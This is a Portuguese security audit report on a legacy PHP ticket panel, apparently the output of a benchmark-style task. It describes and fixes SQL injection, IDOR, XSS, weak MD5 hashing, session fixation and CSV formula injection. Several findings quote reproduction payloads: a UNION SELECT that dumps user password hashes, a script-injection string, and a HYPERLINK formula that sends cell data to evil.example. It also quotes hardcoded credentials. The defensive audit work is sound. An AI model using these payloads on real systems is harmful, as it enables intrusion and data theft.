# RELATÓRIO TÉCNICO — LEB-100-A (Painel de Chamados, NetX ISP)

| | |
| --- | --- |
| Instância | LEB-100-A (nível 100, versão 1.1) · matriz `68088abdb7bc54fa...` |
| Escopo | `code/config.php`, `code/index.php`, `code/lib.php`, `code/schema.sql` (e `code/seed.sql`, sem alteração) |
| Resultado | 23 achados (1 crítica, 7 altas, 7 médias, 8 baixas); 20 corrigidos em `code/`, 3 só reportados (F18, F20, F21) |

## 1. Resumo

O sistema é pequeno (cerca de 300 linhas) e funciona no caminho feliz, mas tem os defeitos típicos de PHP legado, e quase todos vêm de duas causas. **(1)** Nenhuma camada aplica a regra de visibilidade do manifesto: qualquer usuário autenticado lê, busca e exporta os chamados de todos (F2, F3, F4, F23). **(2)** Entrada do usuário chega crua ao SQL, ao HTML e ao CSV (F1, F5, F15). A isso somam-se segredos de produção no código (F6, F8), senhas em MD5 sem sal (F7), sessão fixável (F10), exportação por arquivo fixo e compartilhado que corrompe sob concorrência (F9), N+1 (F12) e uma divisão por zero que derruba a tela principal quando não há dados (F11).

Corrigi 20 dos 23 achados no próprio código, **preservando o manifesto**: as 7 funções públicas mantêm nome, parâmetros, tipos e retorno (conferido por Reflection e por comparação de saída com o original), as rotas e parâmetros `busca`/`ver`/`export` são os mesmos, o CSV é byte a byte idêntico para o dataset de teste, a tabela `#tabela-chamados` mantém colunas e links, e a regra de visibilidade agora é a *pretendida* pelo manifesto (cliente só vê o que abriu; técnico vê tudo). Não reescrevi nada: a lista de mudanças está em `lib.php` (+helpers e variantes `*DoUsuario`), `index.php` (guardas e escape), `config.php` (sem segredos) e uma coluna de `schema.sql`.

**Antes de colocar em produção** (detalhes na seção 4): (a) definir `DB_PASS` no ambiente, senão o painel responde 500; (b) rotacionar a senha do banco e a chave SMTP, pois estiveram em texto claro; (c) rodar `ALTER TABLE usuarios MODIFY senha VARCHAR(255) NOT NULL` para ativar a migração de senhas; (d) se o job noturno lê `EXPORT_DIR/chamados.csv`, ele passa a precisar capturar a saída de `exportarCsv()`.

Calibração das confianças: cada número é a minha probabilidade de o problema ser real. F1 a F5 e F11 foram **reproduzidos** no código original contra um banco real; F15, F17 e F9 têm confiança menor porque dependem de como o CSV é aberto, de `display_errors` e da configuração do servidor web; F22 está em 10 de propósito: documentei o padrão, mas concluí que não é explorável.

## 2. Achados (na ordem em que eu priorizaria a correção)

### F1 — SQL injection em listarChamados: o termo de busca é concatenado ao SQL

- **Onde:** `code/lib.php:82-85` (numeração do arquivo original)
- **Categoria / severidade:** seguranca / **critica**
- **Confiança:** 98/100
- **Corrigido em `code/`:** sim

**Mecanismo.** `$busca` vem direto de `$_GET['busca']` (index.php:72-73) e é concatenado em `WHERE titulo LIKE '%...%'` (lib.php:82), executado por `$db->query()` (L85) sem escape nem parâmetro. Uma aspa fecha o literal e o resto vira SQL. Reproduzido no original: `zzz%' UNION SELECT id,1,NULL,CONCAT(login,':',senha),'x',1,1,NULL,NOW() FROM usuarios -- -` (9 colunas, como `chamados`) devolveu na própria tabela da tela as linhas de `usuarios` com o hash MD5 de cada conta (apareceu `e7d80ffe...` = md5('senha123')). Uma aspa sozinha derruba a página: `mysqli_sql_exception`, HTTP 500.

**Impacto.** Qualquer usuário autenticado, inclusive um cliente, lê tudo o que o usuário de banco `painel` enxerga: hashes de todas as contas (quebráveis em segundos, ver F7, inclusive as de técnicos), todos os chamados e qualquer outra tabela do schema. Não exige privilégio algum além de uma conta.

**O que fiz.** Consulta preparada: `LIKE ?` com o termo como parâmetro (`consultarChamados` + `consultaParametrizada`, lib.php). Reexecutei os mesmos payloads: nenhum vazamento, nenhum erro; busca com aspa agora devolve lista vazia (200) em vez de 500. A semântica da busca (substring no título; `%` e `_` continuam sendo curingas do LIKE) foi mantida.

### F2 — IDOR em ?ver=<id>: qualquer cliente lê chamado de outro cliente

- **Onde:** `code/index.php:52-67` (numeração do arquivo original)
- **Categoria / severidade:** seguranca / **alta**
- **Confiança:** 97/100
- **Corrigido em `code/`:** sim

**Mecanismo.** index.php:53 chama `verChamado($db, (int) $_GET['ver'])` (lib.php:98-102: `SELECT * ... WHERE id = N`) e imprime título e descrição sem comparar o dono do chamado (`usuario_id`) com o usuário da sessão. `$uid` e `$papel` são lidos nas linhas 38-39 e nunca usados. Reproduzido no original: `ana` abriu `?ver=103` e `?ver=104` (chamados de `bruno`) e recebeu 200 com título e descrição.

**Impacto.** Qualquer cliente logado lê o conteúdo de qualquer chamado trocando o número na URL (ids sequenciais, 101...105): reclamações, cobranças, endereços. Viola diretamente a regra de visibilidade do manifesto (cliente só vê o que abriu).

**O que fiz.** `verChamadoDoUsuario()` aplica a regra no SQL (`AND usuario_id = ?` para quem não é técnico). Chamado alheio e chamado inexistente recebem a mesma resposta (HTTP 404, 'Chamado nao encontrado.', corpo idêntico), para não revelar quais ids existem. Verificado para 4 usuários x 5 chamados: cliente só abre os seus, técnico abre todos; a página dos técnicos é idêntica byte a byte à original.

### F3 — Listagem sem filtro de visibilidade: clientes veem os chamados de todos

- **Onde:** `code/index.php:72-73` (numeração do arquivo original)
- **Categoria / severidade:** seguranca / **alta**
- **Confiança:** 97/100
- **Corrigido em `code/`:** sim

**Mecanismo.** `listarChamados($db, $busca)` (lib.php:78-93) não conhece o usuário: faz `SELECT * FROM chamados` sem condição de dono, e index.php:73 entrega o resultado inteiro à tabela. Reproduzido no original: `ana` e `bruno` (clientes) recebem os 5 chamados na listagem, com título, status, prioridade e técnico responsável.

**Impacto.** Todo cliente enxerga os chamados de todos os outros clientes ('Fatura em duplicidade', 'Troca de plano'...). A busca (F1) e o link de detalhe (F2) operam sobre esse universo inteiro.

**O que fiz.** `listarChamadosDoUsuario($db, $uid, $papel, $busca)`: cliente => `WHERE usuario_id = ?`; técnico => sem filtro; papel desconhecido ou vazio é tratado como cliente (nega por padrão). Resultado verificado: ana vê 101, 102, 105; bruno vê 103, 104; carla e diego veem os 5. A busca respeita o mesmo escopo (ana buscando 'Troca' não encontra o chamado de bruno).

### F4 — Exportação CSV entrega todos os chamados a qualquer usuário logado

- **Onde:** `code/index.php:44-47` (numeração do arquivo original)
- **Categoria / severidade:** seguranca / **alta**
- **Confiança:** 97/100
- **Corrigido em `code/`:** sim

**Mecanismo.** A rota `export=csv` chama `exportarCsv($db)` para qualquer sessão válida, e `exportarCsv` (lib.php:132) faz `SELECT * FROM chamados ORDER BY id` sem filtro. Reproduzido no original: o CSV baixado por `ana` traz as 5 linhas, incluindo as de `bruno`, idêntico ao de um técnico.

**Impacto.** Um clique entrega o dump completo e ordenado de todos os chamados a qualquer cliente: pior que F2/F3 porque é em lote e pronto para raspagem.

**O que fiz.** `exportarCsvDoUsuario($db, $uid, $papel)`: cliente exporta só os seus (ana: 101, 102, 105; bruno: 103, 104). Para técnicos o CSV saiu byte a byte igual ao original. `exportarCsv($db)`, com a assinatura do manifesto, continua exportando tudo, para a rotina noturna (uso interno, não exposto na web).

### F5 — XSS refletido: o parâmetro busca é impresso sem escape

- **Onde:** `code/index.php:79-82` (numeração do arquivo original)
- **Categoria / severidade:** seguranca / **alta**
- **Confiança:** 97/100
- **Corrigido em `code/`:** sim

**Mecanismo.** O GET `busca` é impresso cru em dois contextos: dentro de atributo (`value="..."`, L79) e em texto (`Resultados para: ...`, L82). `busca="><script>alert(1)</script>` fecha o atributo e injeta HTML. Reproduzido: 2 ocorrências de `<script>` cru na resposta do original. Os demais campos já passavam por `htmlspecialchars`; só este ficou de fora.

**Impacto.** Um link `index.php?busca=<payload>` (o manifesto confirma que existem links externos com `busca`) executa JavaScript na sessão de quem clicar, tipicamente um técnico. Como o cookie de sessão não tinha HttpOnly (F10), a sessão pode ser roubada; o script também pode agir como a vítima.

**O que fiz.** Helper `escapaHtml()` (`htmlspecialchars` com `ENT_QUOTES | ENT_SUBSTITUTE`, UTF-8) aplicado a `busca` nos dois pontos e também a título, descrição e nome do técnico (flags explícitas: o resultado não depende da versão do PHP). O mesmo payload sai como `&lt;script&gt;`; zero `<script>` cru.

### F6 — Senha do banco de produção embutida como valor padrão

- **Onde:** `code/config.php:12` (numeração do arquivo original)
- **Categoria / severidade:** seguranca / **alta**
- **Confiança:** 97/100
- **Corrigido em `code/`:** sim

**Mecanismo.** `define('DB_PASS', getenv('DB_PASS') ?: 'N3tX@2013!prod')`: se a variável de ambiente faltar (dev, teste, container mal configurado), o código se conecta com a senha real de produção, que está em texto claro no repositório, nos backups e em qualquer cópia do pacote.

**Impacto.** Quem tiver leitura do código ou de um backup obtém a credencial do banco de produção; o fallback ainda faz ambientes não produtivos baterem em produção sem ninguém perceber.

**O que fiz.** Fallback removido: `DB_PASS` vem só do ambiente; se faltar, a conexão falha e o painel responde 500 genérico (testado com a variável ausente). Remover do código não invalida a senha: ela precisa ser rotacionada.

### F7 — Senhas guardadas como MD5 puro, sem sal

- **Onde:** `code/lib.php:15-16` (numeração do arquivo original)
- **Categoria / severidade:** seguranca / **alta**
- **Confiança:** 95/100
- **Corrigido em `code/`:** sim

**Mecanismo.** `autenticar` compara `md5($senha)` com `usuarios.senha` (CHAR(32), schema.sql:7). MD5 sem sal é rápido de calcular e igual para senhas iguais: no seed, ana e bruno têm o mesmo hash, carla e diego também; tabelas pré-computadas quebram `senha123` na hora.

**Impacto.** Qualquer vazamento da tabela (F1 entrega exatamente isso) vira senhas em texto claro, inclusive as das contas de técnico, que veem todos os chamados.

**O que fiz.** Migração progressiva, sem quebrar o contrato nem os usuários de teste: `autenticar` aceita o MD5 legado (comparado com `hash_equals`) e `password_hash`; no primeiro login válido troca o hash por `password_hash()` (bcrypt). `schema.sql` passa a `senha VARCHAR(255)`. Salvaguardas: só grava se a coluna comportar o hash (em modo SQL não estrito, `CHAR(32)` truncaria o hash em silêncio e trancaria o usuário para fora: reproduzi isso) e falha de UPDATE (por exemplo, usuário do banco sem esse privilégio) só vai para o log, o login nunca quebra. A migração só se ativa depois do `ALTER TABLE usuarios MODIFY senha VARCHAR(255) NOT NULL` em produção; contas que nunca logam seguem com MD5 até logarem ou terem a senha redefinida.

### F8 — Chave da API de e-mail embutida no código

- **Onde:** `code/config.php:15` (numeração do arquivo original)
- **Categoria / severidade:** seguranca / **media**
- **Confiança:** 95/100
- **Corrigido em `code/`:** sim

**Mecanismo.** `define('SMTP_API_KEY', 'netx-smtp-9f83e2c1a7b64d05')`: credencial do serviço de e-mail transacional literal no código, sem sequer a opção de ambiente. Nenhum arquivo de `code/` usa a constante, então o único efeito do literal é expor a chave.

**Impacto.** Quem ler o código pode enviar e-mail em nome da NetX (phishing contra clientes com remetente legítimo) até a chave ser revogada.

**O que fiz.** Passou a ler `getenv('SMTP_API_KEY')`, sem valor padrão; a constante continua definida porque outros scripts do ISP podem lê-la. A chave exposta deve ser revogada e substituída.

### F9 — Exportação via arquivo fixo e compartilhado em EXPORT_DIR: corrida e cópia persistente dos dados

- **Onde:** `code/lib.php:125-150` (numeração do arquivo original)
- **Categoria / severidade:** seguranca / **alta**
- **Confiança:** 85/100
- **Corrigido em `code/`:** sim

**Mecanismo.** `exportarCsv` grava em `EXPORT_DIR . '/chamados.csv'` (config.php:18 = `/var/www/painel/tmp`): nome fixo, igual para todas as requisições e usuários, aberto com `'w'` (trunca) e depois relido por `readfile` (L150). Duas exportações simultâneas se pisam: uma trunca o arquivo enquanto a outra o lê. Reproduzido no original com 200 downloads simultâneos (8 workers): 145 íntegros, 54 truncados ou vazios (alguns cortados no meio do cabeçalho) e 1 conexão derrubada. O arquivo também sobrevive à requisição, com o dump completo dos chamados, com a permissão padrão do processo (aqui `-rw-rw-r--`), num diretório dentro da árvore da aplicação: se o servidor web servir esse caminho, `/tmp/chamados.csv` é um download sem login (não verifiquei a configuração do servidor, por isso a confiança fica abaixo das demais).

**Impacto.** Relatórios corrompidos sob carga e uma cópia persistente de dados pessoais de todos os clientes em disco; se o diretório for servido pela web, vazamento público sem autenticação. Aplicar o filtro por dono (F4) em cima desse mesmo arquivo faria um cliente receber o CSV de outro.

**O que fiz.** Sem arquivo intermediário: o CSV é escrito direto em `php://output` (a consulta roda antes de qualquer saída; o formato, `fputcsv` com os mesmos padrões, é byte a byte o mesmo). Mesmo teste de concorrência no código novo, com dois usuários: 48 de 48 respostas corretas. `EXPORT_DIR` continua definido, sem uso.

### F10 — Fixação de sessão e cookie de sessão sem HttpOnly/SameSite

- **Onde:** `code/index.php:15-27` (numeração do arquivo original)
- **Categoria / severidade:** seguranca / **media**
- **Confiança:** 88/100
- **Corrigido em `code/`:** sim

**Mecanismo.** Depois de autenticar, o código grava `$_SESSION['uid']` na sessão que já existia (L24-25) sem `session_regenerate_id()`, e `session_start()` (L15) roda com os padrões do PHP: `use_strict_mode=0`, cookie sem `HttpOnly` nem `SameSite`. Reproduzido: com um `PHPSESSID` escolhido por mim, o login de `ana` terminou em 302 sem novo `Set-Cookie`, ou seja, o ID do atacante virou a sessão autenticada. O cookie emitido era só `PHPSESSID=...; path=/`.

**Impacto.** Quem conseguir plantar um ID de sessão na vítima (via XSS do F5, subdomínio, rede aberta) assume a conta assim que ela logar; sem HttpOnly, um XSS também lê o cookie.

**O que fiz.** `session.use_strict_mode=1`, `cookie_httponly`, `cookie_samesite=Lax`, `cookie_secure` quando a requisição é HTTPS, e `session_regenerate_id(true)` no login. Verificado: ID forjado é descartado e o cookie sai com `HttpOnly; SameSite=Lax`.

### F11 — mediaResposta: divisão por zero derruba a tela principal

- **Onde:** `code/lib.php:116` (numeração do arquivo original)
- **Categoria / severidade:** bug / **media**
- **Confiança:** 95/100
- **Corrigido em `code/`:** sim

**Mecanismo.** A função termina em `return $soma / $qtd;`. Quando nenhum chamado tem `minutos_resposta` (instalação nova, tabela vazia, nada respondido ainda), `$qtd` é 0 e o PHP 8 lança `DivisionByZeroError` (no log: `Uncaught DivisionByZeroError: Division by zero in lib.php:116`). index.php:74 chama a função em toda renderização da listagem, então a página inteira responde 500. Reproduzido nos dois casos (todos NULL e tabela vazia): original = HTTP 500 sem corpo.

**Impacto.** Indisponibilidade da tela principal justamente quando os dados são poucos ou zerados: início de operação, depois de uma limpeza, ou se a coleta de `minutos_resposta` parar.

**O que fiz.** Sem amostras devolve `0.0` (tipo de retorno `float` preservado). Verificado: HTTP 200 e 'Tempo medio de 1a resposta: 0 min'.

### F12 — N+1: uma consulta por chamado para buscar o nome do técnico

- **Onde:** `code/lib.php:69-89` (numeração do arquivo original)
- **Categoria / severidade:** performance / **media**
- **Confiança:** 96/100
- **Corrigido em `code/`:** sim

**Mecanismo.** `tecnicoNome` (L64-72) executa `SELECT nome FROM usuarios WHERE id = N` por chamado; `listarChamados` a chama dentro do laço (L89) e `exportarCsv` também (L137). Para N chamados com técnico são 1 + N consultas. Medido com `Com_select` no original: 5 SELECTs para os 5 chamados do seed (1 + 4 com técnico), tanto na listagem quanto no export.

**Impacto.** Tempo e carga no banco crescem linearmente com o número de chamados a cada abertura da tela e a cada export; o export noturno sobre milhares de chamados vira milhares de idas ao banco.

**O que fiz.** Um único SELECT com `LEFT JOIN usuarios t ON t.id = c.tecnico_id` e `COALESCE(t.nome, '-')`: mesma chave `tecnico_nome`, mesmo '-' quando não há técnico, mesma ordem de colunas. Medido no novo: 1 SELECT. `tecnicoNome()` foi mantida (marcada como deprecated) porque não há como saber se outro script a usa.

### F13 — mediaResposta traz todas as linhas ao PHP só para somar e contar

- **Onde:** `code/lib.php:109-115` (numeração do arquivo original)
- **Categoria / severidade:** performance / **baixa**
- **Confiança:** 90/100
- **Corrigido em `code/`:** sim

**Mecanismo.** `SELECT minutos_resposta FROM chamados WHERE minutos_resposta IS NOT NULL` transfere uma linha por chamado respondido para somar e contar em laço PHP (L110-115), a cada renderização da listagem.

**Impacto.** Memória e tempo O(N) por requisição para obter dois números que o banco calcula com um agregado.

**O que fiz.** `SELECT SUM(minutos_resposta), COUNT(minutos_resposta)` e a divisão continua no PHP, o que preserva o valor bit a bit (25.666666666666668 no seed). `AVG()` não serviria: devolve DECIMAL arredondado em 4 casas e mudaria o float retornado.

### F14 — exportarCsv falha em silêncio e deixa recursos e arquivo parcial para trás

- **Onde:** `code/lib.php:126-135` (numeração do arquivo original)
- **Categoria / severidade:** bug / **baixa**
- **Confiança:** 75/100
- **Corrigido em `code/`:** sim

**Mecanismo.** Se `fopen` falha (L126; plausível, é um caminho absoluto fixo), a função só dá `return`: sem cabeçalho, sem corpo, sem erro. Verificado: com o `EXPORT_DIR` original inexistente, `exportarCsv` produz 0 bytes e apenas um warning. Se a consulta falha depois do `fopen` (L133-135), retorna sem `fclose` e deixa em disco um CSV só com o cabeçalho, que o próximo export pode servir; no PHP 8.1+ `query()` lança exceção e esse ramo é código morto. Além disso, no PHP 8.4 `fputcsv` sem o parâmetro `$escape` emite um `Deprecated` por linha: com `display_errors` ligado, o corpo do CSV baixado começa com texto de erro (reproduzido).

**Impacto.** Falha silenciosa: o usuário ou a rotina noturna acha que exportou e recebe um arquivo vazio, obsoleto ou sujo, sem nenhum erro útil no log.

**O que fiz.** Sem arquivo em disco o `fopen` problemático desaparece; a consulta roda antes de qualquer saída e erro vira exceção (500 genérico + log), nunca CSV parcial com 200. `fputcsv` recebe delimitador, aspas e escape explícitos, que são os padrões do PHP: saída idêntica e sem o `Deprecated`.

### F15 — CSV: título controlado pelo cliente pode virar fórmula na planilha (injeção de fórmula)

- **Onde:** `code/lib.php:138-144` (numeração do arquivo original)
- **Categoria / severidade:** seguranca / **media**
- **Confiança:** 55/100
- **Corrigido em `code/`:** sim

**Mecanismo.** `fputcsv` grava `titulo`, texto digitado pelo cliente, como veio. Célula que começa com `=`, `+`, `-` ou `@` é executada como fórmula ao abrir o CSV no Excel ou LibreOffice. Reproduzido no original: um chamado com título `=HYPERLINK("http://evil.example/?"&A1,"x")` saiu cru no CSV.

**Impacto.** Um cliente consegue plantar uma fórmula que roda na planilha do técnico que exportar (exfiltração por HYPERLINK/WEBSERVICE; DDE em versões antigas). Depende de a vítima abrir o arquivo num editor de planilhas e aceitar os avisos; por isso a confiança é moderada.

**O que fiz.** `csvSeguro()` prefixa um apóstrofo em títulos que começam com `=`, `+`, `-`, `@`, TAB ou CR (recomendação OWASP). Efeito colateral aceito e documentado: um título legítimo como '+55 11 ...' ou '-5 dBm' sai com `'` na frente. Só o título é tratado: o placeholder '-' da coluna Técnico, o cabeçalho e as demais colunas ficam intactos (CSV do seed idêntico ao original).

### F16 — login[]= e busca[]= (array no lugar de string) causam TypeError e HTTP 500

- **Onde:** `code/index.php:22` (numeração do arquivo original)
- **Categoria / severidade:** bug / **baixa**
- **Confiança:** 92/100
- **Corrigido em `code/`:** sim

**Mecanismo.** `$_POST['login']` (L22) e `$_GET['busca']` (L72, usado na L73) vão direto para parâmetros tipados `string` de `autenticar()` e `listarChamados()`. Com `login[]=x` ou `busca[]=x` o PHP não converte array em string e lança `TypeError` (no log: 'listarChamados(): Argument #2 ($busca) must be of type string, array given'). Reproduzido nos dois casos: HTTP 500; o do login nem exige autenticação.

**Impacto.** Qualquer pessoa, sem conta, provoca erro 500 e stack trace no log à vontade; não permite execução de código, mas gera ruído e pode disparar alarmes.

**O que fiz.** Valor que não é string é tratado como credencial inválida (formulário de login de novo, 200) ou como busca vazia (`is_string`).

### F17 — Tratamento de erro de conexão obsoleto: vaza usuário, host e caminhos

- **Onde:** `code/index.php:9-12` (numeração do arquivo original)
- **Categoria / severidade:** bug / **baixa**
- **Confiança:** 55/100
- **Corrigido em `code/`:** sim

**Mecanismo.** `if ($db->connect_errno)` só funciona até o PHP 8.0. Desde o 8.1 o `mysqli` lança `mysqli_sql_exception` já no `new mysqli(...)`, o ramo nunca roda e a exceção sobe sem tratamento. Reproduzido com `display_errors=1` e senha errada: o corpo traz 'Fatal error: Uncaught mysqli_sql_exception: Access denied for user 'painel'@'localhost' (using password: YES)' e o caminho do arquivo (HTTP 200 nesse teste). A severidade real depende de `display_errors`, daí a confiança moderada.

**Impacto.** Vazamento de usuário do banco, host e caminhos internos quando a conexão cai com `display_errors` ligado; com ele desligado, a falha vira uma tela em branco sem mensagem útil.

**O que fiz.** Exception handler global: o detalhe vai para `error_log`, o cliente recebe HTTP 500 e 'Erro interno...'. O ramo `connect_errno` também passou a responder 500 (era 200). Verificado com senha errada e com `DB_PASS` ausente.

### F18 — Login sem nenhuma proteção contra tentativas repetidas

- **Onde:** `code/index.php:20-29` (numeração do arquivo original)
- **Categoria / severidade:** seguranca / **media**
- **Confiança:** 65/100
- **Corrigido em `code/`:** não (só reportado)

**Mecanismo.** O bloco de login (L20-29) chama `autenticar` a cada POST sem contador, atraso ou bloqueio por usuário ou IP; a falha só reexibe o formulário. Os hashes eram MD5 (barato de testar) e o seed usa senhas como `senha123` e `tecmaster`.

**Impacto.** Adivinhação de senha online em alta taxa contra contas de técnico, que enxergam todos os chamados.

**O que fiz.** Não corrigido no código: um limitador confiável precisa de estado compartilhado (tabela nova, Redis) ou de uma camada à frente (limit_req, fail2ban, WAF), o que foge de 'evoluir sem mudar schema nem stack'. A migração de hash (F7) ao menos encarece cada tentativa. Recomendação registrada.

### F19 — rotuloPrioridade: quatro níveis de if/else aninhados escondem uma sequência simples de regras

- **Onde:** `code/lib.php:40-59` (numeração do arquivo original)
- **Categoria / severidade:** qualidade / **baixa**
- **Confiança:** 70/100
- **Corrigido em `code/`:** sim

**Mecanismo.** A função aninha quatro `if/else` para o que são quatro regras em sequência (sem 1ª resposta; prioridade abaixo de 3; dentro de 30 min; crítico ou atrasado). O limite de SLA (30) e as prioridades 3 e 4 ficam enterrados no meio da árvore, e o `else` final está a 15 linhas da condição que ele nega.

**Impacto.** Manutenção difícil e risco de regressão numa regra de negócio que alimenta a listagem e o detalhe; quem for mudar o SLA precisa entender a árvore inteira.

**O que fiz.** Cláusulas de guarda, mesma lógica e mesmos textos. Equivalência provada contra o original em 72 combinações (prioridades -1 a 6 x minutos null, -5, 0, 1, 29, 30, 31, 60, 1000): rótulos idênticos.

### F20 — formatarStatus: qualquer valor fora de 1 e 2 vira "Resolvido"

- **Onde:** `code/lib.php:26-35` (numeração do arquivo original)
- **Categoria / severidade:** bug / **baixa**
- **Confiança:** 30/100
- **Corrigido em `code/`:** não (só reportado)

**Mecanismo.** Só 1 e 2 são testados; todo o resto cai no `else` e retorna 'Resolvido'. Medido: -1, 0, 4 e 5 retornam 'Resolvido'. O schema (TINYINT sem CHECK) não impede valores fora de 1 a 3.

**Impacto.** Se algum sistema gravar outro status (cancelado, reaberto), o chamado aparece e é exportado como resolvido, e o relatório gerencial, que casa pelo texto, o conta como resolvido. Hoje nada no código grava status, por isso a confiança é baixa.

**O que fiz.** Não alterado: o manifesto só fixa 1, 2 e 3, o relatório gerencial consome esses textos, e mudar o comportamento para valores desconhecidos altera saída existente sem uma decisão de produto. Fica registrado para decisão.

### F21 — listarChamados: SELECT * sem LIMIT (inclui TEXT) e busca LIKE com curinga inicial

- **Onde:** `code/lib.php:80-92` (numeração do arquivo original)
- **Categoria / severidade:** performance / **baixa**
- **Confiança:** 50/100
- **Corrigido em `code/`:** não (só reportado)

**Mecanismo.** A função faz `SELECT *` (inclui `descricao`, TEXT, que a tela não exibe), sem LIMIT, e materializa tudo num array; `LIKE '%termo%'` não usa índice. O custo cresce com o histórico inteiro de chamados.

**Impacto.** Com anos de histórico, cada abertura da tela carrega e renderiza todas as linhas; memória e HTML crescem sem teto. Hoje, com poucos chamados, não é perceptível.

**O que fiz.** Não alterado: cada item retornado é uma linha completa de `chamados` (formato consumido por outros scripts) e a tela precisa listar todos; paginar ou projetar colunas muda formato e UX e é decisão de produto. No export, que só usa 5 colunas, passei a selecionar apenas as necessárias.

### F22 — Concatenação de inteiro tipado em SQL (verChamado, tecnicoNome): padrão frágil, mas não explorável

- **Onde:** `code/lib.php:100` (numeração do arquivo original)
- **Categoria / severidade:** qualidade / **baixa**
- **Confiança:** 10/100
- **Corrigido em `code/`:** sim

**Mecanismo.** `verChamado` (L100) e `tecnicoNome` (L69) concatenam um inteiro ao SQL. Como os parâmetros são `int` e `?int`, o PHP converte ou rejeita antes da concatenação (valor não numérico lança TypeError); não consegui montar um payload, então hoje não é SQL injection. Registro apenas por ser um padrão que convida ao erro: basta afrouxar o tipo ou copiar o modelo para um parâmetro string.

**Impacto.** Nenhum hoje; risco de manutenção.

**O que fiz.** Passaram a usar consulta preparada, por consistência com o restante.

### F23 — A regra de visibilidade não existe em nenhuma camada: lib sem contexto de usuário e index.php sem guarda

- **Onde:** `code/index.php:38-39` (numeração do arquivo original)
- **Categoria / severidade:** arquitetura / **media**
- **Confiança:** 80/100
- **Corrigido em `code/`:** sim

**Mecanismo.** A regra do manifesto (cliente só vê o que abriu) não está implementada em lugar nenhum: as funções de `lib.php` (`listarChamados`, `verChamado`, `exportarCsv`) não recebem usuário nem papel, e index.php lê `$uid` e `$papel` nas linhas 38-39 e nunca os usa. Cada rota (listagem, detalhe, export) busca dados por conta própria; por isso a mesma falha apareceu três vezes (F2, F3, F4) em vez de uma só.

**Impacto.** Qualquer rota nova ou script novo que reuse essas funções herda o vazamento; corrigir rota por rota é frágil.

**O que fiz.** Regra centralizada em `donoDoEscopo($uid, $papel)` (técnico => sem filtro; qualquer outro papel => só o próprio; nega por padrão) e três variantes `listarChamadosDoUsuario`, `verChamadoDoUsuario` e `exportarCsvDoUsuario`, que as rotas web passaram a usar. As três funções legadas permanecem com a assinatura do manifesto, agora documentadas como 'sem filtro de visibilidade, uso interno'. Resíduo: quem chamar as legadas a partir de uma rota web volta a vazar; só convenção e revisão de código evitam isso.

## 3. Decisões: o que deliberadamente não mudei, e por quê

1. **formatarStatus: valores fora de 1 a 3 continuam retornando 'Resolvido' (F20).** O manifesto fixa só 1, 2 e 3 e o relatório gerencial casa por esses textos; mudar o default altera saída existente sem uma decisão de produto. Nada em `code/` grava status e o seed só usa 1 a 3; a produção pode conter outros valores, o que não pude verificar.
2. **rotuloPrioridade: chamado de prioridade alta ou crítica ainda sem 1ª resposta (minutos NULL) segue como 'Aguardando 1a resposta', sem escalonamento por SLA (ex.: o chamado 104, prioridade crítica, sem resposta).** É regra de negócio e a função não recebe a data de abertura, então não há como saber há quanto tempo o chamado espera; mudar o rótulo quebraria quem casa por texto. Merece decisão de produto: escalar por tempo desde `criado_em`.
3. **listarChamados: SELECT * sem paginação e busca LIKE '%termo%' (F21).** O formato de retorno (linha completa) é consumido por outros scripts e a tela deve listar tudo; paginar ou projetar colunas muda contrato e UX.
4. **listarChamados, verChamado e exportarCsv continuam sem filtro de visibilidade (uso interno).** Suas assinaturas estão no manifesto e a rotina noturna e o relatório gerencial precisam ver tudo. A web passa pelas variantes *DoUsuario (F23).
5. **tecnicoNome() permanece definida (agora deprecated e sem uso interno).** Não está no manifesto, mas é função global e não dá para provar que nenhum outro script a chama; remover seria arriscar quebra por pouco ganho.
6. **As constantes EXPORT_DIR e SMTP_API_KEY continuam definidas em config.php.** Outros scripts do ISP podem lê-las; EXPORT_DIR já não é usada por exportarCsv, e SMTP_API_KEY agora vem do ambiente.
7. **Limite de tentativas de login (F18).** Exige estado compartilhado (tabela nova, Redis) ou camada à frente (limit_req, fail2ban, WAF): fora de 'sem trocar stack nem schema'.
8. **Cabeçalhos de segurança (CSP, X-Frame-Options, X-Content-Type-Options, HSTS).** Não sei se o painel é embutido em outro sistema nem como o TLS é terminado; o XSS foi corrigido na origem. Melhor configurar no servidor web.
9. **Semântica da busca: % e _ seguem como curingas do LIKE.** É o comportamento atual e não é falha de segurança depois de parametrizar; escapá-los mudaria resultados de buscas existentes.
10. **mediaResposta continua global (não filtrada por dono) e a tela mostra o mesmo indicador a clientes e técnicos.** É um agregado de SLA do ISP, o manifesto não pede filtro e não expõe dado individual.
11. **O papel fica guardado na sessão desde o login; mudança de papel no banco só vale no próximo login. Não há rota de logout nem expiração configurada.** Fora do manifesto: criaria rotas novas e política de sessão. Registrado como melhoria futura.
12. **seed.sql e as senhas de teste (senha123, tecmaster) permanecem como estão.** São dados de teste do contrato (o manifesto os lista). Não devem ser carregados em produção; o seed continua em MD5 e é migrado no primeiro login.
13. **Camada de acesso a dados (mysqli), stack, estrutura de HTML por echo e nomes e caminhos dos arquivos.** Restrição da tarefa: trocar para PDO ou templates mudaria assinaturas e a estrutura HTML declarada, e seria reescrita, não evolução.
14. **Rotação dos segredos que estavam no código (senha do banco, chave SMTP).** Não dá para fazer a partir do código: remover o literal não invalida a credencial. É ação operacional obrigatória (ver Verificação e implantação).

Outras decisões de projeto que valem registro:

- **Compatibilidade antes de elegância.** Não adicionei parâmetros opcionais às funções do manifesto (embora isso fosse compatível para quem chama): criei funções novas ao lado (`listarChamadosDoUsuario`, `verChamadoDoUsuario`, `exportarCsvDoUsuario`) para que a assinatura pública fique literalmente idêntica.
- **Tipos preservados.** Consultas preparadas devolvem `int` onde `query()` devolvia `string`; `linhaComoTexto()` mantém o formato histórico (tudo string, NULL continua NULL), porque consumidores externos podem comparar com `===` ou serializar em JSON.
- **`fputcsv` mantido, com os mesmos padrões.** O CSV real tem `"Aberto em"` entre aspas (o `fputcsv` aspeia campos com espaço); manter o mesmo escritor é o que garante saída idêntica byte a byte. Não troquei o escape para `''`, que mudaria a saída para valores com barra invertida.
- **`mediaResposta`: soma e contagem no SQL, divisão no PHP,** para devolver exatamente o mesmo `float` do original (`AVG()` arredondaria em 4 casas).
- **Migração de senha em vez de troca de formato.** Trocar o `md5` por `password_verify` direto quebraria os usuários de teste do manifesto. A solução aceita os dois formatos e converte no login, com salvaguardas (coluna estreita, UPDATE negado) que impedem que o login falhe.
- **Chamado alheio e inexistente respondem igual (404).** O status de `?ver=<id>` inexistente mudou de 200 para 404, com o mesmo corpo; é a única mudança de status HTTP em rotas existentes, e a escolhi para não revelar quais ids existem.

